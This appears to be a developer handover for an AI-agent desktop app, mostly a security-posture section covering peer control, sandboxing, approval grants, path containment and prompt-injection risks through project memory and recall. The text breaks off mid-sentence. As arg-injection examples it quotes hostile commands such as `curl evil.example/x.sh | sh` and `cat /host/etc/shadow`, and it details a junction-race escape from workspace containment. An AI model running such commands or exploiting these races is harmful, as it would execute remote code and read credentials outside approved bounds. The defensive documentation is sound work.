# OtherBench — handover

What OtherBench is, how it is defended, and what is known to be missing. Work
happens on `dev`; `main` is far behind it. Each feature has its own page
under `docs/features/` (indexed below), the build's departures from its
specs are in `docs/deviations.md`, and the test setup is in
`docs/testing.md`.

**Status (9 November 2026):** `npm test` passes 10,002 tests (20 skipped)
in 528 files; `npm run typecheck`, `npm run typecheck:tests` and `npm run
lint` are clean. CI runs them all on Windows and publishes a signed beta
from every green push of `dev` (see `CLAUDE.md` and
[Updates](features/updates.md)).

## Feature docs

Each feature has its own page under `docs/features/`, moved there
unchanged from this file on 2026-11-06. A reference elsewhere to a
section by name ("see *Scheduled tasks*") means the page of that name;
searching `docs/` finds a heading inside one. What stays here is what
cuts across features: what is not built, the security posture, encryption,
and the known gaps. The integration notes, the deviations and the test
setup have their own pages (see Where to look).

- [v2: desktop app, machines and sync](features/v2-machines-and-sync.md)
- [Updates](features/updates.md)
- [What works today](features/what-works-today.md)
- [The model's browser (Deck #926)](features/browser.md)
- [Computer use (Deck #927)](features/computer-use.md)
- [Settings UI](features/settings-ui.md)
- [Attachments](features/attachments.md)
- [Projects](features/projects.md)
- [Project memory](features/project-memory.md)
- [Claude Code engine](features/claude-code-engine.md)
- [Clean chats, relayed MCP and the Claude Desktop import](features/clean-chats-relayed-mcp.md)
- [The sandbox (spec 2026-10-12-sandbox-design)](features/sandbox.md)
- [Sign-in for HTTP MCP servers](features/mcp-sign-in.md)
- [Thread cards: checklists, questions and plan mode](features/thread-cards.md)
- [Scheduled tasks](features/scheduled-tasks.md)
- [Live artifacts](features/live-artifacts.md)
- [Sub-agents (API profiles)](features/sub-agents.md)
- [Messages sent while a reply runs](features/messages-while-replying.md)
- [Code tab](features/code-tab.md)
- [Code terminal](features/code-terminal.md)
- [Nextcloud tabs](features/nextcloud-tabs.md)
- [Media generation](features/media-generation.md)
- [Overview](features/overview.md)
- [Claude accounts](features/claude-accounts.md)
- [App notes](features/app-notes.md)
- [Fresh chat handover](features/fresh-chat-handover.md)
- [Chats that message each other](features/chat-messages.md)

## What is NOT built

- **The rest of v2 Task 41 (installers).** The release pipeline is built:
  CI's `release` job (`.github/workflows/ci.yml`, not a separate
  `release.yml`) publishes a signed beta on every green push of `dev` and a
  full release on a `vX.Y.Z` tag, and installed apps update from them (see
  [Updates](features/updates.md)). Still not built: Authenticode signing of
  the installer (only the updater's signature exists, so Windows SmartScreen
  still warns on a first install), the Explorer verbs (*Open folder in
  OtherBench*, *Send to OtherBench*) and Linux packages (the bundle targets
  only `nsis`). Task 40's Node SEA wasn't tried: see `docs/deviations.md`.
- **A folder browser for another machine's folders** (part of Task 53).
  The plan forwarded `GET /api/fs/dirs` over the peer listener; that route
  is deliberately never mounted there (it lists directories anywhere on the
  machine), so choosing a folder for a chat that runs elsewhere is a typed
  path, classified against that machine's locations.
- **"Also active on PC"** in the workspace header (Task 53) is not shown.

## Security posture, stated without euphemism

**The peer listener is remote control of this machine, by design.** A
paired machine can run a chat here, and that chat's turn can run the
unsandboxed shell tool once a person approves it. The defences: mutual TLS
with both certificates pinned at pairing plus a per-peer token; the
listener off until pairing and bound only to the chosen hosts (default:
every interface; `--peer-host` to narrow it); only the chat-running routes
and `/peer/*` mounted on it, never settings, folder browsing or attaching
by path; immediate revocation; approvals never delegated (each tool call
still needs an approval or a grant on the machine running it); every
approval audited with the machine it came from. Pairing codes are
single-use, last ten minutes, and are cancelled after five wrong guesses.

**A paired machine can drive this machine's desktop through computer use,
once this machine lets it.** *Let paired machines start and approve
computer use* (Settings → Machines, per machine) is **off by default**:
the default is `false` in `DEFAULT_APP_SETTINGS`, and since a default is
never written to the database (only a change is), an install from before
2026-11-05 that never touched the setting reads it as off with no
migration. It is **switched on only by the person at the machine, in its
desktop app's own native dialog**. A switch-on (`PATCH /api/settings`,
`peerComputerControlNeedsHostConfirm`) makes the server ask the shell over
its private stdio channel (`settings.confirm`, `HostConfirm`, the same
channel and the same kind of Windows message box as the computer-use start
dialog, Cancel the default, closing itself as Cancel after 110 s): "Let
paired machines start and approve computer use on this computer?" with
what that lets a paired machine do (`PEER_COMPUTER_CONTROL_CONFIRM_TEXT`).
Only the person's OK writes `true`; Cancel, nobody answering, a hello or the
channel going while it is up, an older shell that doesn't know the method,
or a server with no desktop channel at all (headless, sign-in mode, the
desktop app not running) leave it off (403 `not_confirmed` or
`desktop_app_only`) and write nothing else in the request. No HTTP client
can reach that channel, so a forged header, a script with the token, or a
signed-in phone can at most make the question come up on this machine. The
shell shows only the server's text and reports the click; it refuses to ask
while a chat holds a session or a start dialog may be up, holds back every
action and every start while the question is up, and the server asks
nobody while computer use may be in control (`mayBeInControl`) and only one
question at a time (409). Before asking, a request whose `Origin` isn't one
of the shell's `--cors-origin`s is refused at once (403
`desktop_app_only`, `mayChangePeerComputerControl`), so a browser tab or a
phone gets a clear answer and no dialog pops up here for it; any program
can forge that header, so it is only that early refusal, not the boundary.
Turning it off asks nobody and works from anywhere that reaches Settings.
The peer listener has no settings route, and settings never sync, so a
paired machine can't turn it on.
With it on, a paired machine can ask to start a computer-use session here
(`POST /api/chats/:id/computer/start` on the peer listener, or a message
whose reply uses the computer), send messages while it is in control, and
answer its cards, "always" grants for an app included: so once someone
here has accepted the session it can click and type in any app the cards
let through, as the person signed in here, with nobody here approving
each step. What still holds: computer use must already be switched on
here (the desktop app with `OTHERBENCH_COMPUTER_USE=1`, and the chat's
profile); a remote start never switches either on and is refused, saying
so, when they're off. This machine's own native start dialog asks before
every session, whoever asked for it, and says which paired machine asked;
nobody answering is a Cancel after 110 s. A start runs through the same
`ComputerSessions.ensureSession`, and every action through the same
`PermissionBroker` cards and grants, as a local one. The banner says which
machine started the session and the audit names the machine each call was
approved from (`decidedOnNode`). The setting is read on the server for
every call, never trusted from the caller. What it gives up: while a
session is in control, the desktop-only gate (below, under Computer use)
no longer covers the peer listener, so a model holding a lasting browser
grant here that can reach the paired machine's OtherBench in that browser
could answer its own cards through it. **To switch it off**, untick the
setting on the machine being controlled (from anywhere that reaches its
Settings): a paired machine can then only
see a session here and Stop it (Stop is always allowed, and ends a session
only if that chat holds one). Off is meant to hold against input as well
as against starts and answers: every write a paired machine sends over the
listener that isn't a stop (a turn, a note or steer into a reply this
machine started, a regenerate or retry, a head change, an answer to a card
or question, a withdrawn note, the start itself) marks the chat it names
as that machine's *before* it is handled (`PeerInfluence`,
`forwardedApi`), and the mark stays while anything that input could reach
is still to come: a reply running in the chat (so whatever it spawns,
sub-agents included), a background task, or a note not yet delivered. It
fails closed: a mark is dropped only once nothing holds it and the chat is
idle. Each peer write holds it until that write has been handled, counted,
so two overlapping writes keep it until both are done. Every reply running
or started while the chat is marked is remembered, and a turn Claude Code
starts by itself after one of those (a background task reported back,
possibly after the chat had gone quiet) marks the chat again and holds the
mark from the moment it is asked for, before anything is awaited, until it
is running or declined (`PeerInfluence.inherit`, `background.ts`). That
memory of influenced replies is never trimmed to make room (only a deleted
chat's replies are forgotten), so a flood of replies can't wash a mark out.
It is kept in memory, not on the message row: a self-started turn comes
from a Claude Code process this server started, and those end with it, so
after a restart nothing can carry on a reply from before it except a turn a
person or a paired machine (marked anew) sends. Every
computer-use start goes through `ComputerSessions.ensureSession`, whose
`startCheck` treats a start in a marked chat as the paired machine's:
refused while the setting is off, named on the banner while it is on. A
write whose chat this machine can't tell (an unknown card, question or
message) is refused while the setting is off. While a session is in
control the desktop-only gate refuses every one of those writes anyway, so
no card can be answered from the paired machine. Stops (the chat's, a
reply's, a background task's, computer use's) neither mark nor are
refused. What it can't cover: sync. A paired machine's synced rows
(messages it wrote, a profile's tool policy) reach this machine without
the listener, as they always have (*Peer sync is an ungated write path
during a session*, under Computer use); a later turn here reads them. To take a machine's access away entirely,
remove it in Settings → Machines. What the peer listener lets a paired
machine read is unchanged apart from this: the computer-use start can tell
it whether computer use is on here (the refusal says so), and the
`activity` announcement now carries the chats controlling this computer
with their last action (`actionSummary`, the same line as the banner,
which never holds typed text and is derived from the stored tool call
that syncs anyway). The computer-use status route and `/api/events` are
still not on the listener. Grants, the audit trail and MCP health are
readable for a chat that runs here since 2026-11-07 (next paragraph but one).

**A paired machine can read this machine's schedules, and do nothing else
with them.** The `/peer/events` stream carries a `schedules` announcement:
for each schedule its id, name, rule in words, zone, whether it is on or
paused, next run, whether its rule is unreadable, its target's and
profile's ids (the other machine names them from rows it already has by
sync), whether it runs in auto mode, its time limit, whether a run is going,
and its last run's result, start time and chat id (`PeerScheduleSummary`,
`peer/schedules.ts`). Never the prompt, the warnings or the message id of a
run in progress. It is a read, so it needs no opt-in; the receiving side
checks and bounds every field and keeps at most 100. There is no schedule
route on the peer listener, read or write: `/api/schedules` isn't in
`forwardedApi` and nothing under `/peer/` touches schedules, so a paired
machine can't create, edit, pause, delete, run or stop one here
(`server/test/peer/schedules.test.ts` calls each path over real TLS and
checks the store is unchanged).

**A paired machine can read the Inspector's tool state of a chat that runs
here, and only take things away.** So that the Inspector shows the tools a
chat actually uses (Adam's call, 2026-11-07), `forwardedApi` mounts
`chatToolStateRoutes` (`routes/tools.ts`): for a chat that runs here, its
grants (chat-scoped plus the "always" grants its profile matches), its audit
trail and this machine's MCP server health (names, transport, status, tool
counts, errors and a signed-in server's account name; never commands, URLs,
env, headers or tokens, which `McpServerHealth` doesn't carry and `GET
/mcp-servers/:id` isn't on the listener). The writes are
revoking a grant that chat lists and reconnecting an MCP server already set
up here; neither puts input into a chat, so neither marks it for computer
use (`PEER_NO_INPUT`). Like every chat route on the listener, a chat that
doesn't run here is refused (409 `not_here`), and while computer use may be
in control the two writes are refused unless paired machines may drive it.
Adding, editing, enabling, deleting or signing in an MCP server, and making
a grant, are not reachable from a paired machine. This machine announces
`tool-state` on `/peer/events` when any of the three changes: the section and
a chat id only. Tested over real TLS in `server/test/peer/tool-state.test.ts`.

**Sign-in mode is the whole UI on the network, by design** (`--public-url`,
spec 2026-10-12-remote-access). A signed-in browser is the box's user
account: it can approve shell commands, browse any folder (`GET
/api/fs/dirs`), attach a file by path and import from a folder. The
defences: a password (scrypt, at least 12 characters, in `login.json`, not
the database) and a session cookie (`__Host-`, `HttpOnly; Secure;
SameSite=Strict`, counted only when `Sec-Fetch-Site` says same-origin);
HTTPS only (no plain-HTTP sign-in, no HSTS, no redirect); a Host check
against the public URLs; the cross-site write check; 5 wrong passwords lock
an address (an IPv6 /64) out for 15 minutes; globally, at most 120
password checks run in any hour (100 without a remembered-device cookie,
the old lockout's number, plus 20 with one), and every attempt is slowed
down once wrong passwords pile up, but sign-in never closes for everyone:
a browser kept signed in before (a signed remembered-device cookie, which
is not a session, locked by its own id) skips the budget and the delay, a
clean address (no failure in a day) has 5 checks kept for it, and a new
device can still be told to come back during a flood by an attacker with
about 1,900 fresh addresses a day; the limits live in memory, so a restart
resets them (see "Sign-in limits" under Remote access); `/view/` links work
only from
the address that made them (weak behind shared NAT, nothing behind a proxy
that sends no `X-Forwarded-For`); and `frame-ancestors 'none'` on the UI in
every mode. With `--tls auto` the first visit is trust-on-first-use: only
checking the CA's fingerprint against `otherbench serve`'s own output stops a
man in the middle. The CA's private key is thrown away after it signs the
one server certificate, so a stolen disk can't mint certificates that
devices trusting it would accept. Sessions are kept in the database
(`remote_session`, local, never synced) so a restart keeps them; only each
token's SHA-256 is stored, so a copy of the database (or of a
`.before-schema-*` backup) hands out no usable cookie, though anyone who can
write to the database could add a session of their own. Settings lists the
signed-in devices and signs any one out; its open event streams close at
once.

**The host shell tool (`run_command` with `shellRuns` absent or `host`) is unsandboxed by design.** It executes
whatever command string the model produces on the real OS with the real
user's privileges; there is no seccomp, no container, no restricted PATH.
The *only* control on it is the approval gate — every call needs a human
decision unless a grant already covers it — so the gate has to be right,
because it's the entire defense, not one layer of several.

**The sandboxed shell has two walls, and a break-out of the inner one reaches more than its own chat.** With `shellRuns: 'sandbox'`, `run_command` runs in the `otherbench-sandbox` WSL2 distro (interop and automount off) under the sandbox runtime (bubblewrap, a filtering proxy). The runtime keeps a command to its chat's folders (none of them when the profile's file access is off), its home `/home/otherbench/chats/<chat>` and its own temp folder, and off the network except allowlisted hosts. A command that broke out of the runtime would reach everything in the distro, every folder mounted for any chat with a running agent (read-write where some chat has it writable), and the VM's network; with WSL's `networkingMode=mirrored` that includes services on this machine that only listen locally, OtherBench's own API among them, which is why Settings > Sandbox warns about it. In remote access's sign-in mode (`--public-url`) OtherBench listens on a non-loopback address, so even in WSL's default NAT mode a break-out could reach OtherBench's port over the VM's virtual network; there it would find only the password-protected HTTPS sign-in (and the OAuth callback, which needs a pending flow's 256-bit `state`), and Settings > Sandbox doesn't warn about this case. A break-out of the VM reaches Windows (Hyper-V's boundary, as with Cowork). drvfs mounts carry the Windows user's own rights, so read-only is enforced by the runtime (`denyWrite`) and, when no running chat needs a folder writable, by a read-only mount as well. drvfs folders also ignore case while the runtime's binds and guards hold one spelling, so a read-only folder nested in a writable one is refused and the agent puts back the files that make code run on Windows (git hooks and config, `.vscode`, Claude Code's settings and hooks, ...) after every command; a planted file exists until the command ends (see "The sandbox" below). The runtime is beta (0.0.x) and pinned; setup's self-test runs again on every Repair and any surprise marks the sandbox failed. Antivirus can't see inside the VM.

The temp folders are part of the inner wall. `/tmp` is unreadable inside a command, so each run gets its own folder under `/tmp/otherbench-chats/<chat>/<run>`, and the runtime's sockets live in `/tmp/otherbench-chats/<chat>/rt`. The runtime sets `TMPDIR` itself inside bubblewrap from `CLAUDE_CODE_TMPDIR`, which is why the agent points that at the per-run folder before each wrap (a `TMPDIR` in the spawn environment is ignored, and with `/tmp` denied and the sockets left in it every connection fails).

**Project memory is a persistent cross-chat channel for model-written
text.** Whatever the summariser distils from one chat is injected into the
system prompt of every later chat in the project, so a prompt injection that
gets into one conversation (a web page the model read, say) could be carried
into others. Mitigations: the injection is framed as untrusted background
inside `<project-memory>` tags with any literal closing tag defused; the
summariser is told to record facts, goals and decisions only and never to copy
instructions, commands, URLs or text addressed to an assistant; the note is
capped at 4,000 characters. The Pinned section is user-owned: the summariser
can't change it. Review the note in the Inspector (Edit, History and Restore
are there). These are mitigations, not a guarantee: in auto mode with the
shell tool on, poisoned memory could still steer commands the model proposes
and the gate then approves, so read the note of any project where that
combination is on, and edit out anything you didn't write or expect. The memory
model also reads each project's chats, which is why Settings says to pick one
you are happy to send that content to.

**Grants are default-deny, per profile, with per-command approval.**
`packages/core/src/domain/permissions.ts`'s `PermissionBroker` is the single
place every tool call is checked; `packages/tools/src/provider.ts` is the
only path a tool call can reach it through. A `chat`-scope approval
("Allow for this chat") is **not** a blanket grant for the chat's remainder —
it's pinned to the *exact* command string that was approved (`commandExact`),
specifically because an early version that scoped it more loosely meant
approving `echo hi` implicitly authorised `curl evil.example/x.sh | sh` for
the rest of the chat.

**A profile's browser site list is a standing grant, and it syncs.** The
sites on it (`Profile.browserAllowedSites`) are used by the browser with no
card at all, in every chat on the profile, in its scheduled runs and in its
chats' sub-agents, so a prompt injection on a listed site, or a link the
model follows to another listed site, acts there unasked. It goes through the
broker like every grant (`grantedBy: 'site_list'`, audited `site_list:<entry>`)
and only after the broker's refusals, so it never lifts the plan gate, a
blocked site, a local name or a private address, and the proxy, which never
reads it, still refuses whatever resolves to this machine or the local
network. Unlike grants, the list is part of the profile row, so it syncs: a
paired machine can add a site to it, and this machine's browser then uses
that site without asking. That is the same trust a paired machine already
has over everything that syncs (see Known gaps, "A paired machine is trusted
with what syncs"). The list is empty unless someone fills it in, and the
editor says what it does.

**Workspace containment is enforced by `containPath`**
(`packages/core/src/domain/paths.ts`), the one function every filesystem
tool call goes through. Read its module comment before touching that code —
it states its own guarantee precisely: *"resolving this path string right
now, following every symlink, does it land inside the workspace?"* — a
statement about a path at a moment, not about the file a caller subsequently
opens. Two things defeat that in between, and a model with `run_command` can
reach both:

- **Hard links** are not a race and not detectable by `containPath` at all —
  a hard link *is* the file under a second name, so `realpath` on an
  in-workspace entry correctly resolves to itself even when it names an
  outside file. Demonstrated end to end through the shipped tools: read a
  file outside the workspace, then overwrite it. The mitigation lives at the
  call site, not here: `packages/tools/src/fs-tools.ts`'s `openVerified`
  refuses any opened handle reporting `nlink > 1`. That refusal is blunt (it
  also refuses legitimately hard-linked files) and accepted as such — a
  false refusal is recoverable, a false accept is not. It's also not
  complete: a filesystem that doesn't report link counts (some network
  mounts) reports 1 and the check silently passes, narrowing the attack to
  volumes where Node can see link counts rather than eliminating it.
- **TOCTOU** — a directory component gets swapped for a junction pointing
  outside the workspace between the containment check and the tool actually
  using the path. Not theoretical: an unprivileged worker-thread racer,
  toggling that swap as fast as the OS allows while the main thread hammers
  the tool in a loop, reproduced it live against the *previous* version of
  these tools — `read_file` leaked attacker content 20 times in 15,981
  attempts, `list_dir` enumerated an outside directory 977 times in 39,993
  (~2.4% per attempt), and a separate run landed 184 `write_file` writes on
  an outside file. The current mitigation (`openVerified`/`readdirVerified`
  bracketing every step from the first identity check through the open/read
  and a second containment verdict) closes the sub-window the old code
  actually left open. Re-run under the same live racer today: `read_file`'s
  regression test asserts zero leaks per attempt across a non-vacuous run
  (swaps > 0, attempts > 100); `list_dir`'s asserts a leak rate under 0.5% —
  explicitly a narrowing, not a fix, per that test's own name; `write_file`'s
  is weaker evidence by design (it checks the outside file's final content
  once, not per attempt, so a pass there means "no corruption observed this
  run," not a percentage claim — see that test's own comment for why). The
  residual, stated in `fs-tools.ts`'s own module comment: an attacker who can
  land four precisely-timed toggles (outside file visible at the first
  check, clean at containment, outside again through the open, clean again
  at the final containment verdict) is still not stopped, and directory
  listings (`list_dir`, and the glob side of `search_files`) hold no file
  handle at all — Node exposes no fd-based `readdir` — so a swap that lands
  and reverts entirely inside one `readdir` call is undetectable by
  construction, not just unlikely. Read `paths.ts` and `fs-tools.ts` directly
  for the exact bracketing and the exact residual; both are documented
  in-module, and the in-module version is the one that stays in sync with
  the code as it keeps changing — this section already lagged it once.

**Extra folders widen containment, not past it.** A chat (and its project)
can name up to 10 other folders, each read-only or read & write
(`chat.folders`, `project.folders`; schema 15). File tools go through
`containPathIn`, which checks the workspace and each folder with the same
`containPath` and lets the innermost root decide, so a read-only folder
inside a writable one stays read-only. A write into a read-only folder is
refused before any card (PermissionBroker for the API tools, the PreToolUse
gate for Claude Code, and again in fs-tools). Claude Code is deliberately not
given the folders as `additionalDirectories`, which would load the skills and
commands under each one's `.claude`; only the workspace's config loads. It
reaches them anyway once the gate allows a call, in default and auto mode
(live probe, `packages/engine-claude-code/test/fixtures/README.md`), and the
system prompt names them. Shell commands are not path-contained, so read-only
binds file tools only; shell approval is still the control. A folder missing
on the machine running the reply is left out of that turn.

**The viewer reads chat folders the same way the file tools do** (Deck #826).
Every path goes through `containPathIn` and fs-tools' `openVerified` /
`readdirVerified`, on this machine only; on Windows a path with `:` after the
drive (a hidden stream) or a segment ending in `.` or a space is refused,
since Windows would open a different file from the one named. Text comes
through the authed API (first 2 MB, binary refused). What the browser loads
itself comes through `/view/<id>/<name>` links: 128 random bits, 10 minutes
from last use (so an open page's late loads still work) but never past an
hour from when it was made (a sandboxed page can reach the web and could
hand its link on, so use can't keep one alive for good), server memory only, no token (the id is the capability), containment checked
again on every request, and the link dies as soon as its folder stops being
the chat's or the chat is deleted. Making a link needs a JSON request, so a
cross-site form can't. The served type is from a fixed list with `nosniff`;
everything but PDF gets the sandbox CSP (opaque origin, network https/wss
only), and HTML iframes are `sandbox="allow-scripts allow-forms"`. A page can't
save a file unless the person presses Let this page save files in the viewer,
which reloads it on a new link with `allow-downloads` on both the CSP and the
iframe; a new version or a reopen starts without it. It is off by default
because Chromium lets such a page save a file as it loads, with no click. Live
pages and Mermaid diagrams can't have it. PDF is the
exception (Chromium won't show one sandboxed): it can't script the page, but
it isn't sandboxed either. Websites open in the default browser, never in
OtherBench: links and the viewer's address box call `openInBrowser`, and
every shell window is built through `links.rs` (main and quick are
`create: false` in tauri.conf.json for this), so a window never navigates
itself to a website (a dropped link) and a request for a new window ("Open
link in new window", Shift- or middle-click, `window.open`) is always denied,
a website going to the default browser instead. Every app command needs
an `allow-<command>` permission (`build.rs` declares the app manifest),
granted only to the main and quick windows. Show in folder reveals and never opens. A
viewed Markdown file's relative links and images resolve from its own
folder; each image gets its own `/view/` link (`ViewerImage`), so it goes
through the same containment. A path Windows would read as another file is
refused on every platform, not only on Windows. None of it is on the peer
listener.

**Artifacts run through one executor and the viewer's sandbox** (Deck #896).
The model makes them with the `artifact` tool. For API engines it's an OtherBench
tool with source `artifact`. For Claude Code it comes from an in-process SDK
MCP server bound to the running reply, named `otherbench_<16 hex>` afresh for each
process: the gate passes only that exact tool name, as source `artifact`. A
fixed name could be taken by a repo's `.mcp.json`, and its tool would get the
same pass, so a server called `otherbench` is just another MCP server with cards.
Calls go through the broker and the audit but never get a card.
`toolPolicy.artifacts: false` refuses them, and Claude Code then gets no
server at all; the switch is part of the live process key. A model whose
row says it can't use tools isn't sent the tool, since artifacts are on by
default. The system prompt only carries the fixed guidance; the branch's
artifacts are a note added to the user's message in the request (never
stored), so the system prompt stays the same as artifacts change and Claude
Code keeps its live process and every engine its prompt cache. Titles and
languages reach the model that way, so a title is one line (the tool and
your edits alike) and a language is a short token, and the note flattens and
quotes both. Sync refuses artifact rows from another machine that OtherBench
couldn't have made (a bad id, kind, language or maker, a title over one line,
a number below 1, content over 1 MB). Versions never change and follow the branch (the newest whose
reply is on it); a reply on another branch that creates an existing id gets
that branch's first version of the same artifact. Each version has its own
kind and language (schema 17): a rewrite can make a note into a page, so how
a version renders, what type it's served as and its file name all follow the
version, never the artifact. `message_id` isn't a foreign key, so a synced
version can arrive before its reply; a tie in version numbers (made on both
machines before they synced) goes to the later, then the larger id. Web pages and Mermaid diagrams are served from
the database through `/view/` links in the sandbox (Mermaid is OtherBench's own
copy, bundled into `assets/`, in strict mode, with the source HTML-escaped);
SVG only as an image; Markdown through React and code through highlight.js.
Edit and Save to workspace are JSON-only. Saving goes through `containPathIn`
and `openVerified`, refuses read-only folders, writes before it truncates,
and replaces a file only when asked (a file another program makes between
the check and the open gets the same question). A code artifact's file
extension comes from a fixed list of languages, else `.txt`, so a download
is never a `.bat` or `.hta`. The web must never import
`@otherbench/core/domain/artifacts.js`: it pulls in `node:crypto`. Schemas 16 and 17.

Office artifacts (`document` Markdown, `spreadsheet` and `presentation`
JSON) are checked by `core/domain/office-spec.ts` when the tool or your edit
stores them, and checked again when the file is made, since a synced version
was never checked. A document is bounded too: 120,000 characters, 6,000
lines, tables of 1,000 rows and 10,000 cells, indents of 24 columns, quotes 8
deep and 10,000 formatting marks outside code. The checks are early, clear
errors for the model; they aren't what keeps a hostile document harmless. The
.docx/.xlsx/.pptx is made only on Download (`GET
…/versions/:versionId/file`: `application/octet-stream`, `attachment`,
`nosniff`, `default-src 'none'; sandbox`) or Save to workspace (unchanged
containment and `openVerified`), and always in a `worker_threads` Worker
(`office/render.ts`, `render-worker.ts`): 512 MB of heap, a 20 s wall-clock
limit, at most two at once, and any failure (a writer's, the limit's, running
out of memory) is a 422 with a message. The bundle has a second entry for it,
`dist-bundle/server/render-worker.js`, which must sit beside `cli.js`. No
writer is given a path or URL to fetch: no images, no pptx links or media,
docx links only for http, https and mailto, which are text in the file.
Formulas are an allowlist, not a denylist: only Excel's built-in worksheet
functions (about 500, each with the file prefix Excel wants, `_xlfn.` or
`_xlfn._xlws.`) pass a fail-closed tokenizer, and WEBSERVICE, FILTERXML,
IMAGE, HYPERLINK, RTD, CALL, REGISTER, REGISTER.ID, EXEC, STOCKHISTORY,
TRANSLATE, DETECTLANGUAGE, COPILOT, INFO, CELL and INDIRECT are named and
refused. Bare names, `[` (other workbooks, tables), `|` (DDE), 3-D
references, control characters, `@` and the `#` spill operator are refused;
LET, LAMBDA, its helpers, GROUPBY and PIVOTBY aren't supported in phase 1.
The text that is checked is the text that is written: `formulaForFile` gives
the exact `<f>` content, and the renderer rewrites each `<f>` from it because
the library alters some characters (the .xlsx test reads it back and compares).
The workbook asks Excel to calculate everything on open. Formulas in a small
subset also get a cached value (`office/formula-values.ts`, see the Office
bullet under Known gaps) so viewers that don't calculate show something; the
evaluator only reads the spec and its tokens come from core's `formulaTokens`,
so it calculates the text that is written. An attached file's text is the user's, fenced, and may carry
instructions the model follows: the approval gate is unchanged.

**Live artifacts can read MCP data while a page is open** (spec
2026-10-12-live-artifacts, Deck #929; schema 24, see "Live artifacts" below).
An html artifact may declare up to 10 calls to read-only MCP tools
(`readOnlyHint: true`; a tool that declares nothing is refused), with only
enum and bounded-integer parameters. You allow them once in the viewer, and
each approval is a `chat` grant with a `live` constraint bound to the call's
declaration hash, the MCP server's id, the chat's profile and this machine.
Changing a call's args asks again, and a model rewrite that leaves the calls alone doesn't. Only
`PermissionBroker.grantLive` makes those grants, `resolve()` refuses one, an
ordinary call never matches one, and the broker's live branch never asks and
never takes the ask-on-mutate read pass. The page has an opaque origin and no
token. It posts to the app frame, which checks the message came from that
frame, and the server builds every argument from the stored declaration. Live
pages are served with no network at all (`default-src 'none'`, `connect-src`,
`frame-src`, `child-src`, `worker-src`, `object-src` and `manifest-src` all
`'none'`, no `'unsafe-eval'`, `form-action 'none'`, DNS prefetch off). What
that can't stop: the page navigating its own frame with data in the address,
WebRTC to a STUN or TURN host, and DNS lookups that slip past the prefetch
header. The viewer closes a page that navigates once the new document loads,
but that guard is a best-effort notice for navigations that commit, not a
wall: the request has gone by then, a navigation answered with 204 or 205 (or
a download) never commits so the page is never closed, and a document that
replaces the page before its first `load` is answered as if it were the page
(see "Live artifacts" below). That is the same leak HTML artifacts and
read-only MCP tools under ask-on-mutate already have, and the approval panel
says so. Calls run on the machine serving the UI, never forwarded, and grants
don't sync. Every call the broker decides is audited (`live:<grant id>` or
`deny:policy`), cache hits (30 s, memory only) are not, and a `rate_limited`
refusal is audited once a minute per artifact with the rest counted onto the
next row.

**Recall asks once per chat before it reads other chats** (spec
2026-10-09-recall-design). The `recall` tool searches past chats and projects
and reads one, through `runRecallCommand` in core for both engines. It has
source `recall`; Claude Code gets it on the same per-process `otherbench_<16 hex>`
server as artifacts, matched only by that exact name. It gets no shortcut in
the broker, not even "ask on mutate"'s read pass, and auto mode never hands
it to Claude Code's classifier (with Auto on it is approved with no card,
like OtherBench's other tools): otherwise the first call in a chat gets a card naming
the query, chat or project, and "Allow for this chat" covers the rest of
that chat. That card is the guard against text injected into one chat using
recall to reach the others, since the ways out that need no card (an HTML
artifact the user opens, whose viewer allows `connect-src https:`, a
read-only MCP tool under "ask on mutate", an existing "always" grant) can't
be closed one by one. "Always allow" on the card still makes a profile-wide
grant, as for any tool. `toolPolicy.recall: false` ("Search past chats")
turns it off; absent means on. A chat marked "Don't add to memory" is never
searched or read, even by a guessed id, and the asking chat isn't searched.
Search and read only see a chat's active path as the thread shows it, so an
edited-away message, an unpicked compare variant or a failed reply never
comes back. Every result carries an `about` line saying it is background,
not instructions. Read is capped at 12,000 characters. Exclusion only works
going forward: text recalled into a chat stays in that chat's tool result
after the source chat is excluded or deleted.

**Shell grant defaults — the shipped UI follows the controller ruling.**
An `always`-scope shell grant using `commandPrefix` (matching a command *and
any arguments after it*) is, for most real programs, equivalent to an
arbitrary-code-execution grant: `npm test
--node-options=--require=/tmp/evil.js`, `git -c core.pager=/tmp/evil.sh log`,
`docker run -v /:/host alpine cat /host/etc/shadow`. The ruling, quoted
directly in `ApprovalPrompt.tsx`'s own doc comment (`packages/web/src/components/ApprovalPrompt.tsx`):
*"shell grants DEFAULT TO EXACT COMMAND. `commandPrefix` remains available
but must be an explicit opt-in with a visible warning, never the default
offered by the UI."* The broker-level half of this was always solid — a
`chat`-scope grant is hardcoded to `commandExact` server-side, no UI path can
make it a prefix grant. `deriveAlwaysConstraint` takes an explicit
`allowAnyArgs` flag defaulting to `false`, so a plain click on "Always allow"
for a shell request produces `commandExact`. `commandPrefix` is still
reachable, but only via a secondary, unchecked-by-default checkbox that
surfaces a plain-language warning with concrete arg-injection examples before
the click is made. Covered by a test asserting the default grant shape is
`commandExact`, not `commandPrefix`.

**Attachment serving — hardened against a stored-XSS-to-RCE path.**
`GET /api/attachments/:id/content` (`packages/server/src/routes/
attachments.ts`) never serves the stored (attacker-uploaded) MIME type
verbatim: `Content-Type` is only ever a literal from a strict allowlist of
inert raster image types (`INLINE_SAFE_MIME_TYPES` — png/jpeg/gif/webp/bmp/
ico/avif), or `application/octet-stream`. `image/svg+xml` is deliberately
excluded (SVG is XML and can carry `<script>`, unlike a raster image).
`Content-Disposition` defaults to `attachment` and is `inline` only for that
same allowlist; `X-Content-Type-Options: nosniff` and a restrictive
`Content-Security-Policy: default-src 'none'; sandbox` are defence in depth.
The filename goes through a `contentDisposition()` helper that strips
control characters, neutralises `"`/`\` in the legacy quoted fallback, and
carries the exact original name via RFC 5987 `filename*=UTF-8''...`. On the
client, the image-preview gate (`Composer.tsx`/`Message.tsx` via
`AttachmentChip`) uses `api.attachments.previewable(mime)`, a matching
raster-only allowlist, instead of a bare `mime.startsWith('image/')` check.
This was a real path from "uploaded a file" to "ran a command on the
machine," not an alert box in a sandboxed viewer: this origin also hosts the
API that runs shell commands and holds the bearer token.

**Other sites can't write to the API** (Deck #897). Browser mode (`otherbench
serve` with no token) had no defence against a page on another site posting
a hidden `text/plain` form to `/api/...`: every write route reads its body as
JSON whatever its type, so a form could create a connection or a profile.
`cross-site.ts` refuses a POST, PUT, PATCH or DELETE under `/api` with 403
unless the browser marks it `Sec-Fetch-Site: same-origin` (which a page
can't set; `npm run dev` through Vite's proxy passes this way), or its
`Origin` is the server's own or one of the desktop webview's
`--cors-origin`s, or it carries neither header (curl, scripts, tests). An
opaque `null` origin is refused. So is any write a browser marks as
anything but fetch (`Sec-Fetch-Dest` other than `empty`, or
